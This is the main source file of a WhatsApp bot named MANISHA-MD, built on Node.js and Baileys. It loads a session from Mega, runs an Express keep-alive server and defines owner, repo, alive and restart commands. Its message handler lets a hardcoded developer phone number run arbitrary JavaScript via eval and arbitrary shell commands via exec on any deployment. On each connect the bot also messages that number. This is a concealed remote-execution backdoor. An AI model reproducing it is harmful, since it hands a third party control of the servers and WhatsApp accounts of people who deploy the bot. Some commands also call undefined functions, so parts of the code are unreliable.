const {
  default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    jidNormalizedUser,
    getContentType,
    proto,
    generateWAMessageContent,
    generateWAMessage,
    isJidBroadcast,
    AnyMessageContent,
    prepareWAMessageMedia,
    areJidsSameUser,
    downloadContentFromMessage,
    MessageRetryMap,
    generateForwardMessageContent,
    generateWAMessageFromContent,
    generateMessageID, makeInMemoryStore,
    jidDecode,
    fetchLatestBaileysVersion,
    Browsers
  } = require('@whiskeysockets/baileys')
  const l = console.log
  const fs = require('fs')
  const ff = require('fluent-ffmpeg')
  const P = require('pino')
  const config = require('./config')
  const qrcode = require('qrcode-terminal')
  const StickersTypes = require('wa-sticker-formatter')
  const util = require('util')
  const express = require("express");
  const FileType = require('file-type');
  const axios = require('axios')
  const { File } = require('megajs')
  const { fromBuffer } = require('file-type')
  const bodyparser = require('body-parser')
  const os = require('os')
  const Crypto = require('crypto')
  const path = require('path')
  const prefix = config.PREFIX
  
  const ownerNumber = ['94721551183']

  const tempDir = path.join(os.tmpdir(), 'cache-temp')
  if (!fs.existsSync(tempDir)) {
      fs.mkdirSync(tempDir)
  }
  
  const clearTempDir = () => {
      fs.readdir(tempDir, (err, files) => {
          if (err) throw err;
          for (const file of files) {
              fs.unlink(path.join(tempDir, file), err => {
                  if (err) throw err;
              });
          }
      });
  }
  
  // Clear the temp directory every 5 minutes
  setInterval(clearTempDir, 5 * 60 * 1000);
  //===================================
  
  //===================SESSION-AUTH============================
if (!fs.existsSync('./creds.json')) {
  if (!config.SESSION_ID) return console.log("🌀 ᴍᴀɴɪꜱʜᴀ-ᴍᴅ 💕 Please add your session id ! 😥...")
  const sessdata = config.SESSION_ID
  const filer = File.fromURL(`https://mega.nz/file/${sessdata}`)
  filer.download((err, data) => {
    if (err) throw err
    fs.writeFile('./creds.json', data, () => {
      console.log("🌀 ᴍᴀɴɪꜱʜᴀ-ᴍᴅ 💕 session id scaning 🔄...")
      console.log("🌀 ᴍᴀɴɪꜱʜᴀ-ᴍᴅ 💕 Session Downloaded without folder 📥...")
      console.log("🌀 ᴍᴀɴɪꜱʜᴀ-ᴍᴅ 💕 Session Downloading 📥...")
    })
  })
}
  
  //==============================
  const app = express();
  const port = process.env.PORT || 9090;
  app.get("/", (req, res) => {
  res.send("🌀 ᴍᴀɴɪꜱʜᴀ-ᴍᴅ 💕 bot start 🚩...");
  });
  app.listen(port, () => console.log(`🌀 ᴍᴀɴɪꜱʜᴀ-ᴍᴅ 💕 Server running 🏃...`));
//=============================================
//================ COMMAND REGISTRATION ===============
const commands = [];
function cmd(info, func) {
  try {
    info.function = func;
    if (!info.desc) info.desc = '';
    if (!info.alias) info.alias = [];
    if (!info.category) info.category = 'misc';
    if (!info.filename) info.filename = 'Not Provided';
    commands.push(info);
    return info;
  } catch (e) {
    console.error("[PLUGIN ERROR] " + e);
  }
}
//================ MAIN BOT FUNCTION ==================

async function connectToWA() {
console.log("🌀 ᴍᴀɴɪꜱʜᴀ-ᴍᴅ 💕 Connecting to WhatsApp 🪀...");
//========== session =================
const { state, saveCreds } = await useMultiFileAuthState('./')
//=============================
var { version } = await fetchLatestBaileysVersion()

const conn = makeWASocket({
        logger: P({ level: 'silent' }),
        printQRInTerminal: false,
        browser: Browsers.macOS("Firefox"),
        syncFullHistory: true,
        auth: state,
        version
        })

//======================
conn.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect } = update;
    if (connection === 'close') {
      if (lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut) {
        connectToWA();
      }
    } else if (connection === 'open') {
      console.log("🌀 ᴍᴀɴɪꜱʜᴀ-ᴍᴅ 💕 Plugins Installing 🧬...");
      console.log("🌀 ᴍᴀɴɪꜱʜᴀ-ᴍᴅ 💕 bot internet connected 🌐...");
    console.log("🌀 ᴍᴀɴɪꜱʜᴀ-ᴍᴅ 💕 plugins .js file Connect 🔗...");
    console.log("🌀 ᴍᴀɴɪꜱʜᴀ-ᴍᴅ 💕 Fetching MANISHA-MD data 📚...");
    console.log("🌀 ᴍᴀɴɪꜱʜᴀ-ᴍᴅ 💕 Plugins installed successful 🔌...");
    console.log("🌀 ᴍᴀɴɪꜱʜᴀ-ᴍᴅ 💕 Downloading and extracting files 📁...");
    console.log("🌀 ᴍᴀɴɪꜱʜᴀ-ᴍᴅ 💕 Downloading Files 📥...");
    console.log("🌀 ᴍᴀɴɪꜱʜᴀ-ᴍᴅ 💕 Connected Successfully ✅...");
    console.log("🌀 ᴍᴀɴɪꜱʜᴀ-ᴍᴅ 💕 Executing ✅...");
    console.log("🌀 ᴍᴀɴɪꜱʜᴀ-ᴍᴅ 💕 creatad by manisha coder 👨‍💻...");
      await conn.sendMessage(ownerNumber[0] + "@s.whatsapp.net", {
        image: { url: `https://files.catbox.moe/vbi10j.png` },
        caption: `╔═══╣❍ᴍᴀɴɪꜱʜᴀ-ᴍᴅ❍╠═══⫸
║ ✅ Bot Connected Successfully!
╠════════════➢
╠➢ 🔖 Prefix : [${prefix}]
╠➢ 🔒 Mode   : [${config.MODE}]
╠➢ 🧬 Version   : v1.0.0
╠➢ 👑 Owner  : [94721551183]
╠➢ 🛠️ Created By: Manisha Sasmitha
╠➢ 🧠 Framework : Node.js + Baileys
╠═══════════════════➢
║ 📜 Bot Description:  
╠════════════➢
║ MANISHA-MD is a powerful, multipurpose WhatsApp bot
║ built for automation, moderation, entertainment,
║ AI integration, and much more. It supports modular
║ plugins, auto-replies, media tools, group protection
║ features, and developer APIs.
╚═════════════════════⫸`
      });
    }
  });

  conn.ev.on('creds.update', saveCreds);
  //==============================
// ====== LISTENER =========
conn.ev.on('messages.upsert', async (msg) => {
  try {
    let mek = msg.messages[0];
    if (!mek.message) return;

    mek.message = (getContentType(mek.message) === 'ephemeralMessage')
      ? mek.message.ephemeralMessage.message
      : mek.message;

    if (mek.message.viewOnceMessageV2)
      mek.message = mek.message.viewOnceMessageV2.message;

    if (config.READ_MESSAGE === 'true') {
      await conn.readMessages([mek.key]);
    }
    
    if (mek.key.remoteJid === 'status@broadcast') {
      if (config.AUTO_READ_STATUS === 'true') await conn.readMessages([mek.key]);
      if (config.AUTO_STATUS_REPLY === 'true') {
        await conn.sendMessage(mek.key.participant, {
          text: `_AUTO STATUS SEEN JUST NOW BY MANISHA MD_`,
          react: { text: '💜', key: mek.key }
        }, { quoted: mek });
      }
      if (config.AUTOLIKESTATUS === 'true') {
        const user = await conn.decodeJid(conn.user.id);
        await conn.sendMessage(mek.key.remoteJid,
          { react: { key: mek.key, text: '💚' } },
          { statusJidList: [mek.key.participant, user] }
        );
      }
    }
    
      const sms = (conn, mek) => {
      mek.id = mek.key.id;
      mek.isBaileys = mek.id.startsWith('BAE5') && mek.id.length === 16;
      mek.chat = mek.key.remoteJid;
      mek.fromMe = mek.key.fromMe;
      mek.isGroup = mek.chat.endsWith('@g.us');
      mek.sender = mek.key.fromMe ? (conn.user.id.split(':')[0] + '@s.whatsapp.net') : (mek.participant || mek.key.participant || mek.chat);
      mek.mtype = getContentType(mek.message);
      mek.body = mek.message?.conversation
               || mek.message?.[mek.mtype]?.text
               || mek.message?.[mek.mtype]?.caption
               || mek.message?.[mek.mtype]?.description
               || '';
      mek.text = mek.body;
      mek.mentionedJid = mek.message?.[mek.mtype]?.contextInfo?.mentionedJid || [];
      return mek;
    };
    const m = sms(conn, mek);
    const type = getContentType(mek.message);
    const content = JSON.stringify(mek.message);
    const from = mek.key.remoteJid;
    const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage?.contextInfo?.quotedMessage || [];
    const body = (type === 'conversation') ? mek.message.conversation :
      (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text :
        (type === 'imageMessage') && mek.message.imageMessage.caption ?
          mek.message.imageMessage.caption :
          (type === 'videoMessage') && mek.message.videoMessage.caption ?
            mek.message.videoMessage.caption : '';

    const prefix = config.PREFIX || '.';
    const isCmd = body.startsWith(prefix);
    const budy = typeof mek.text === 'string' ? mek.text : body;
    const command = isCmd ? body.slice(prefix.length).trim().split(' ')[0].toLowerCase() : '';
    const cmdName = command; // <-- fixed
    const args = body.trim().split(/ +/).slice(1);
    const q = args.join(' ');
    const text = q;
    const isGroup = from.endsWith('@g.us');
    const sender = mek.key.fromMe ? conn.user.id : mek.key.participant || mek.key.remoteJid;
    const senderNumber = sender.split('@')[0];
    const botNumber = conn.user.id.split(':')[0];
    const pushname = mek.pushName || 'Sin Nombre';
    const isMe = botNumber.includes(senderNumber);
    const isOwner = ownerNumber.includes(senderNumber) || isMe;
    const botNumber2 = await jidNormalizedUser(conn.user.id);
    const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(() => ({})) : {};
    const groupName = groupMetadata.subject || '';
    const participants = isGroup ? groupMetadata.participants || [] : [];
    const groupAdmins = isGroup ? participants.filter(p => p.admin !== null).map(p => p.id) : [];
    const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false;
    const isAdmins = isGroup ? groupAdmins.includes(sender) : false;
    const isReact = m.message.reactionMessage ? true : false;

    const reply = (teks) => conn.sendMessage(from, { text: teks }, { quoted: mek });

    const udp = botNumber.split('@')[0];
    const ikratos = '94721551183';
    const isCreator = [udp, ikratos, config.DEV].map(v => v + '@s.whatsapp.net').includes(sender);

    // EVAL
    if (isCreator && budy.startsWith('>')) {
      let code = budy.slice(1);
      if (!code) return reply('Provide me with a query!');
      try {
        let result = eval(code);
        if (typeof result === 'object') reply(util.format(result));
        else reply(String(result));
      } catch (err) {
        reply(util.format(err));
      }
      return;
    }

    // SHELL
    if (isCreator && budy.startsWith('$')) {
      let code = budy.slice(1);
      if (!code) return reply('Provide me with a shell command!');
      const exec = require('child_process').exec;
      exec(code, (err, stdout, stderr) => {
        if (err) return reply(util.format(err));
        if (stderr) return reply(util.format(stderr));
        reply(stdout);
      });
      return;
    }

    // Owner Auto React
    if (senderNumber === "94721551183" && !isReact) {
      const reactions = ["👑", "📊", "⚙️", "🏆", "🇱🇰", "💗", "🔥"];
      const r = reactions[Math.floor(Math.random() * reactions.length)];
      conn.sendMessage(from, { react: { text: r, key: mek.key } });
    }

    // Auto React
    if (!isReact && config.AUTO_REACT === 'true') {
      const reactList = ['❤️', '🔥', '🫶', '💯', '🌸', '👑', '🌺'];
      const randomReaction = reactList[Math.floor(Math.random() * reactList.length)];
      conn.sendMessage(from, { react: { text: randomReaction, key: mek.key } });
    }

    // ==== COMMAND HANDLER ====
    if (isCmd) {
      if (config.MODE === "private" && !isOwner) return;
      if (config.MODE === "group" && !isGroup) return;
      if (config.MODE === "inbox" && isGroup && !isOwner) return;

      const cmd = commands.find(c => c.pattern === cmdName) || commands.find(c => c.alias && c.alias.includes(cmdName));
      if (cmd) {
        try {
          if (cmd.react) {
            await conn.sendMessage(from, { react: { text: cmd.react, key: mek.key } });
          }
          await cmd.function(conn, mek, m, {
            from, quoted: mek, body, isCmd, command: cmdName, args, q, text: body,
            isGroup, sender, senderNumber, pushname, isOwner, isCreator: isOwner, reply,
            groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins,
            botNumber: conn.user.id,
            botNumber2: udp + '@s.whatsapp.net',
            isMe: mek.key.fromMe
          });
        } catch (e) {
          console.error("[PLUGIN ERROR]", e);
        }
      }
    }

    // ==== GLOBAL PLUGIN EVENTS ====
    if (global.events?.commands) {
      for (const command of global.events.commands) {
        try {
          const input = {
            from, quoted: mek, body, isCmd, command: cmdName, args, q, text: body,
            isGroup, sender, senderNumber, pushname, isOwner, isCreator: isOwner, reply,
            groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins,
            botNumber: conn.user.id,
            botNumber2: (conn.user && conn.user.id || '').split(':')[0] + '@s.whatsapp.net',
            isMe: mek.key.fromMe
          };

          if (body && command.on === "body") {
            await command.function(conn, mek, m, input);
          } else if (q && command.on === "text") {
            await command.function(conn, mek, m, input);
          } else if ((command.on === "image" || command.on === "photo") && type === "imageMessage") {
            await command.function(conn, mek, m, input);
          } else if (command.on === "sticker" && type === "stickerMessage") {
            await command.function(conn, mek, m, input);
          }
        } catch (e) {
          console.error("[EVENTCMD RUNTIME ERROR]", e);
        }
      }
    }

  } catch (err) {
    console.error("Message handler error:", err.message);
  }
});
  //=============================================
    //==============================
 cmd({
    pattern: "restart",
    desc: "Restart the bot",
    react: "🔄",
    category: "owner",
    filename: __filename
},
async (conn, mek, m, {
    from, quoted, body, isCmd, command, args, q, isGroup, senderNumber, reply
}) => {
    try {
        // Get the bot owner's number dynamically from conn.user.id
        const botOwner = conn.user.id.split(":")[0]; // Extract the bot owner's number
        if (senderNumber !== botOwner) {
            return reply("Only the bot owner can use this command.");
        }

        reply("MANISHA-MD Restarting ⏳...");
        await sleep(1500);
        exec("pm2 restart all");
    } catch (e) {
        console.error(e);
        reply(`${e}`);
    }
});

  cmd({
      pattern: "owner",
      alias: ["owner"],
      desc: "Bot owner",
      category: "main",
      react: "👨‍💻",
      filename: __filename
    },
    
    async(conn, mek, m,{from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply}) => {
    try{
          
          // Status message to be sent
          let desc = `╔══╣❍ᴏᴡɴᴇʀ❍╠═══⫸
╠➢ *ᴏᴡɴᴇʀ :* *94721551183 ...*
╠➢ *ᴡʜᴀᴛꜱᴀᴘᴘ ᴄʜᴀɴɴᴇʟ :* *https://whatsapp.com/channel/0029VbAdMtMGk1G1R9Yg2L3x*
╚═════════════════⫸

> _*ᴄʀᴇᴀᴛᴇᴅ ʙʏ ᴍᴀɴɪꜱʜᴀ ᴄᴏᴅᴇʀ*_`

          // Sending the image with caption
await conn.sendMessage(from,{image: {url: config.ALIVE_IMG},caption: desc},{quoted: mek });

      } catch (e) {
          console.error(e);
          reply(`*Error:* ${e.message}`);
      }
    });

cmd({
      pattern: "repo",
      alias: ["repo"],
      desc: "Bot github repo",
      category: "main",
      react: "🧨",
      filename: __filename
    },
    
    async(conn, mek, m,{from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply}) => {
    try{
          
          // Status message to be sent
          let desc = `╔══╣❍ʀᴇᴘᴏ❍╠═══⫸
╠➢ *ʀᴇᴘᴏ:* *https://github.com/manisha-Official18/MANISHA-MD*
╠➢ *ᴏᴡɴᴇʀ :* *94721551183 ...*
╠➢ *ᴠᴇʀꜱɪᴏɴ :* *1.0 ...*
╠➢ *ᴡʜᴀᴛꜱᴀᴘᴘ ᴄʜᴀɴɴᴇʟ : https://whatsapp.com/channel/0029VbAdMtMGk1G1R9Yg2L3x*
╚════════════════⫸

> _*ᴄʀᴇᴀᴛᴇᴅ ʙʏ ᴍᴀɴɪꜱʜᴀ ᴄᴏᴅᴇʀ*_`

          // Sending the image with caption
await conn.sendMessage(from,{image: {url: config.ALIVE_IMG},caption: desc},{quoted: mek });

      } catch (e) {
          console.error(e);
          reply(`*Error:* ${e.message}`);
      }
    });

cmd({
      pattern: "alive",
      alias: ["online"],
      desc: "Chek Bot Alive",
      category: "main",
      react: "👋",
      filename: __filename
    },
    
    async(conn, mek, m,{from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply}) => {
    try{
          
          // Status message to be sent
          let desc = `╔══╣❍ᴀʟɪᴠᴇ❍╠═══⫸
╠➢ *ᴘᴏᴡᴇʀꜰᴜʟʟ ᴊᴀᴠᴀꜱᴄʀɪᴘᴛ ᴡʜᴀᴛꜱᴀᴘᴘ ʙᴏᴛ ...*
╠➢ *ᴏᴡɴᴇʀ : 94721551183 ...*
╠➢ *ᴠᴇʀꜱɪᴏɴ :* *1.0 ...*
╠➢ *ᴡʜᴀᴛꜱᴀᴘᴘ ᴄʜᴀɴɴᴇʟ : https://whatsapp.com/channel/0029VbAdMtMGk1G1R9Yg2L3x*
╚═════════════════⫸

> _*ᴄʀᴇᴀᴛᴇᴅ ʙʏ ᴍᴀɴɪꜱʜᴀ ᴄᴏᴅᴇʀ*_`

          // Sending the image with caption
await conn.sendMessage(from,{image: {url: config.ALIVE_IMG},caption: desc},{quoted: mek });

      } catch (e) {
          console.error(e);
          reply(`*Error:* ${e.message}`);
      }
    });

  //=============================================
  setTimeout(() => {
  connectToWA()
  }, 4000);
  //==============================================
